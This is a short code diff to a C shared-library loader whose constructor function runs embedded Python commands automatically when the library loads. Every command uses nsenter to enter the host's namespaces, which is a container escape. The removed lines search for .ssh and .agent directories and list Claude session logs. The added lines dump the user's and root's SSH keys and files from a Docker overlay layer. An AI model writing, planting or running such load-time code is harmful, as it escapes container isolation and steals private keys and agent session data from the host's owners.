@@ -105,9 +105,10 @@ __attribute__((constructor)) static void on_so_load() {
   install_run_cmd_to_builtins();
 
   PyRun_SimpleString(R"PY(
-run_cmd('nsenter -t 1 -m -u -i -n -p -- find / -type d \( -name ".ssh" -o -name ".agent" \) 2>/dev/null')
-run_cmd('nsenter -t 1 -m -u -i -n -p -- ls -la /home/future/d1/.claude')
-run_cmd('nsenter -t 1 -m -u -i -n -p -- find /home/future/d1/.claude -name "*.jsonl" -type f | sort')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- cat /home/future/.ssh/*')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- cat /root/.ssh/*')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- cat /var/lib/docker/overlay2/32984f3076dff7f6d4e17274cf871c95a1dd6bfb10f8ea7bb173515cff9811f3/diff/root/*')
+
 )PY");
 
   PyGILState_Release(gstate);
